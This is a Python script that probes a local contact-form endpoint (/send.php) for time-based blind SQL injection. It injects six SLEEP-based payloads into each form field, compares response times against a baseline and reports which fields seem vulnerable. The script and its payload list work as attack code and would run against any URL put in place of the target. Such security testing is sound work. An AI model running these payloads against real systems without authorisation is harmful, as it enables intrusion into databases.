import requests
import time
from urllib.parse import urlencode

# Configuration
target_url = "http://localhost/send.php"
parameters = ['fullname', 'email', 'phone', 'subject', 'message']
sleep_payloads = [
    "' OR SLEEP(5)-- ",
    "'; SLEEP(5);-- ",
    "') OR SLEEP(5);-- ",
    "' OR (SELECT SLEEP(5))--",
    "' UNION SELECT SLEEP(5)--",
    "'||(SELECT SLEEP(5))--",
]

# Valid data values for other parameters when testing one
valid_data = {
    'fullname': 'John Doe',
    'email': 'john@example.com',
    'phone': '555-1234',
    'subject': 'Test Inquiry',
    'message': 'This is a test message'
}

def measure_request_time(payload_data):
    """Send request and return response time"""
    start_time = time.time()
    try:
        response = requests.post(
            target_url,
            data=payload_data,
            allow_redirects=False,
            timeout=30  # Max wait time
        )
        end_time = time.time()
        return end_time - start_time, response.status_code
    except Exception as e:
        end_time = time.time()
        return end_time - start_time, f"ERROR: {str(e)}"

# Step 1: Establish baseline timing
print("=" * 60)
print("BLIND SQL INJECTION TEST - TIME-BASED")
print("=" * 60)
print(f"Target: {target_url}")
print("Testing parameters:", parameters)
print()

print("[*] Establishing baseline response time...")
baseline_times = []
for i in range(3):
    response_time, status = measure_request_time(valid_data)
    baseline_times.append(response_time)
    print(f"  Baseline request {i+1}: {response_time:.3f}s (Status: {status})")

average_baseline = sum(baseline_times) / len(baseline_times)
print(f"[*] Average baseline time: {average_baseline:.3f}s")
print()

# Step 2 & 3: Test each parameter with sleep payloads
print("[*] Testing parameters with sleep injection payloads...")
print()

vulnerable_parameters = []

for param in parameters:
    print(f"\n[TESTING PARAMETER: {param}]")
    print("-" * 50)
    param_vulnerable = False
    
    for i, sleep_payload in enumerate(sleep_payloads):
        # Create test data - inject payload into single parameter
        test_data = valid_data.copy()
        test_data[param] = sleep_payload
        
        # Measure response time
        print(f"  Payload {i+1}: {sleep_payload[:40]}...")
        response_time, status = measure_request_time(test_data)
        
        # Calculate delay compared to baseline
        delay = response_time - average_baseline
        
        print(f"    Response time: {response_time:.3f}s | Delay: {delay:.3f}s | Status: {status}")
        
        # Check if delay meets success criteria (4+ seconds)
        if delay >= 4.0:
            print(f"    [!] POSITIVE: Significant delay detected!")
            if not param_vulnerable:
                param_vulnerable = True
                vulnerable_parameters.append(param)
        else:
            print(f"    [-] Negative: No significant delay")
    
    print()

# Step 4 & 5: Print results summary
print("=" * 60)
print("FINAL RESULTS")
print("=" * 60)
print(f"Baseline average: {average_baseline:.3f}s")
print(f"Threshold for vulnerability: {average_baseline + 4.0:.3f}s (baseline + 4s)")
print()

if vulnerable_parameters:
    print("[!] VULNERABILITY DETECTED!")
    print(f"[!] Parameters confirmed vulnerable to time-based SQL injection:")
    for param in vulnerable_parameters:
        print(f"    - {param}")
    print()
    print("[!] CONCLUSION: /send.php is VULNERABLE to blind SQL injection via time-based payloads")
else:
    print("[-] No significant delays detected across all parameters and payloads")
    print("[-] CONCLUSION: /send.php appears NOT VULNERABLE to time-based SQL injection")
    print("    (Note: Other SQL injection types may still exist)")

print("=" * 60)
